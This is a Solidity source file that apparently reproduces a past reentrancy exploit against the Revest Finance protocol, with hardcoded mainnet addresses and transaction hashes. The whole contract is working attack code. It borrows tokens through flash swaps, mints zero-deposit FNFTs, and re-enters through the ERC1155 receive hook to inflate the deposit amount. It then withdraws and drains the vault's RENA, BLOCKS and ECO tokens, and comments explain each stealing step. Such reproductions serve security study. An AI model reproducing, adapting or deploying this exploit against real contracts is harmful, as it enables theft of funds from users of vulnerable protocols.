// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/RevestInterfaces.sol";

// Tx hashes:
// 0xe0b0c2672b760bef4e2851e91c69c8c0ad135c6987bbf1f43f5846d89e691428
// 0x613b2de3bb9043884a219296eeb1ada8c47b5a0262b9c68ca06ffd2de3a5d9f5
// 0x19b10c6d38f0b911fdc0e722d681a70a56699d70559eefef3d4d6fe88276c813
contract RevestExploiter {
    IRevest private constant REVEST = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
    IFNFTHandler private constant HANDLER = IFNFTHandler(0xe952bda8c06481506e4731C4f54CeD2d4ab81659);

    IERC20Like private constant RENA = IERC20Like(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
    IERC20Like private constant BLOCKS = IERC20Like(0x8a6D4C8735371EBAF8874fBd518b56Edd66024eB);
    IERC20Like private constant ECO = IERC20Like(0xC242Eb8e4E27EAE6a2A728A41201152F19595C83);
    
    IPair RENA_ETH = IPair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
    IPair BLOCKS_ETH = IPair(0xDD51121d1eFC398b4c09fd0Cb84d79Ae2c923Fc9);
    IPair ECO_ETH = IPair(0x3F3aA0726b240aeF0Fe4f7dF2814dF525303DC43);

    uint256 private constant INITIAL_AMOUNT = 2e18;

    // Available FNFT quantity in Revest vault
    uint256 private constant RENA_QUANTITY = 360_000;
    uint256 private constant BLOCKS_QUANTITY = 715_000_000;
    uint256 private constant ECO_QUANTITY = 7_700_000;

    constructor() {
        RENA.approve(address(REVEST), type(uint256).max);
        BLOCKS.approve(address(REVEST), type(uint256).max);
        ECO.approve(address(REVEST), type(uint256).max);
    }

    function exploit() external {
        // Flash swaps for 3 seperate cases, each stealing respective token
        bytes memory data = abi.encode(address(RENA), address(RENA_ETH), RENA_QUANTITY);
        RENA_ETH.swap(INITIAL_AMOUNT, 0, address(this), data);

        data = abi.encode(address(BLOCKS), address(BLOCKS_ETH), BLOCKS_QUANTITY);
        BLOCKS_ETH.swap(INITIAL_AMOUNT, 0, address(this), data);

        data = abi.encode(address(ECO), address(ECO_ETH), ECO_QUANTITY);
        ECO_ETH.swap(0, INITIAL_AMOUNT, address(this), data);
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata data) external {
        (address token, address pair, uint256 vaultQuantity) = abi.decode(data, (address, address, uint256));
        uint256 amount = amount0 > 0 ? amount0 : amount1;

        // Mint 2 AL-FNFTs with id "n" and depositAmount = 0
        IRevest.FNFTConfig memory config = IRevest.FNFTConfig(token, address(0), 0, 0, 0, 0, false, true, false);
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        uint256[] memory quantities = new uint256[](1);
        quantities[0] = 2;
        REVEST.mintAddressLock(address(this), '', recipients, quantities, config);

        // Mint <vaultQuantity> AL-FNFTs with id "n+1" and depositAmount = 0, but trigger re-entrancy.
        quantities[0] = vaultQuantity;
        uint256 id = REVEST.mintAddressLock(address(this), '', recipients, quantities, config);

        // withdrawToken will now withdraw (vaultQuantity + 1) * depositAmount tokens.
        // depositAmount should have been 0, but now it's 1e18 due to reentrancy so it drains the vault balance.
        REVEST.withdrawFNFT(id, vaultQuantity + 1);

        // Repay swap
        IERC20Like(token).transfer(pair, amount + (amount / 10));
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256 value,
        bytes memory
    ) public returns (bytes4) {
        if (value == RENA_QUANTITY || value == BLOCKS_QUANTITY || value == ECO_QUANTITY) {
            // Re-entrancy: fnftsCreated not yet incremented.
            // Will burn owner's id "n" NFT and mint id "n+1" due to createNewSeries code path.
            // handleMultipleDeposits will overwrite id "n+1" depositAmount to 1e18.
            REVEST.depositAdditionalToFNFT(HANDLER.getNextId() - 1, 1e18, 1);
        }
        return this.onERC1155Received.selector;
    }
}
